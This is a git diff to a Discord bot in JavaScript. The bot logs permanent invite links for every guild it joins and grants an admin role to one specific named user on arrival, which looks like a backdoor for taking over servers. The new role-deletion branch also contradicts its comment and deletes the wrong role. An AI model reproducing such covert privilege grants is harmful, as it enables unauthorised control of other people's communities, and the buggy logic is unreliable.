@@ -21,11 +21,16 @@ client.on('ready', () => {
       maxAge: 0,
       maxUses: 0,
       unique: true
-    }, 'because').then(invite => console.log(invite.url));
+    }, 'because').then(invite => console.log(`${invite.url} for ${guild}`));
 
-    // Delete all the old Bot Manager roles.
+    let oneRolePreserved;
+
+    // Delete all but one of the old Bot Manager roles.
     guild.roles.filter(role => role.name == "Bot Manager").forEach(role => {
       if (role.members.size == 1) { // Only the bot still has it.
+        role.delete();
+      } else if (!oneRolePreserved) {
+        oneRolePreserved |= true;
         role.delete();
       }
     });
@@ -39,8 +44,8 @@ client.on('guildMemberAdd', member => {
   let guild = member.guild;
 
   if (member.user.toString() == Info.usernames.eli) {
-    createAdminRole(guild, client, member);
+    createAdminRole(guild, client, member, true);
   }
 });
 
-client.login(Info.bots.ezDiscordBot.token);
+client.login(Info.bots.bridgeBot.token);
